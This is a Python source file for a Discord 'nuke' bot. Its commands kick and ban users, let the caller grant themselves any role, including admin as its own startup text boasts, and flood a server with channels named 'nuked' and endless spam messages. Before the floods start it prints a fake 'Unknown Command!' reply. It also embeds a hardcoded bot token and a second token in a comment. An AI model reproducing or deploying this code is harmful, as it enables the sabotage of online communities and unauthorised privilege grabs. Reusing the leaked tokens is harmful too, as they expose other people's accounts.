import discord
from discord.ext.commands import bot
from discord.ext import commands
import random
import asyncio
import time
from threading import Thread
from random import randint
import datetime
import os
import aiohttp
import sys
import traceback
import json
from discord.utils import get
 
 
bot = commands.Bot(command_prefix='!')
 
@bot.event
async def on_ready():
    print("BOT ACTIVATED!")
    print("Bot name: " + bot.user.name)
    print("commands :")
    print("!k : !k (user)")
    print("!b : !b (user)")
    print("!s : spam on a channel")
    print("!r : !r (role name) u can use this to give yourself admin")
    print("!c : channel spam")
    print('discord version: ' + discord.__version__)
 
@bot.command(pass_context = True)
async def k(ctx, userName: discord.User):
    await bot.kick(userName)
 
@bot.command(pass_context = True)
async def b(ctx, userName: discord.User):
    await bot.ban(userName)
 
@bot.command(pass_context=True)
async def r(ctx, user: discord.User, role: discord.Role):
    await bot.add_roles(ctx.message.author, role)  
 
@bot.command(pass_context=True)
async def c(ctx):
    await bot.say("Unknown Command!")
    time.sleep(2)
    for i in range (0,10000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000):
        await bot.create_channel(ctx.message.server, 'nuked', type=discord.ChannelType.text)
 
@bot.command(pass_context=True)
async def s(ctx):
    await bot.say("Unknown Command!")
    time.sleep(2)
    for i in range (0,10000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000):
        await bot.say("meme") #text 1 goes here
        await bot.say("review") #text 2 goes here
 
 
bot.run ("NTQ3ODkxNjU2MzMxMTAwMTYy.D09XgA.MCBmREma3txRU4LtDsFcQRdsJxY")
#NTQ3ODU5NDkyODY0MjYyMTY1.D085nw.5MD25ZZqOPoeVjwXRy0Wlf5yBF0
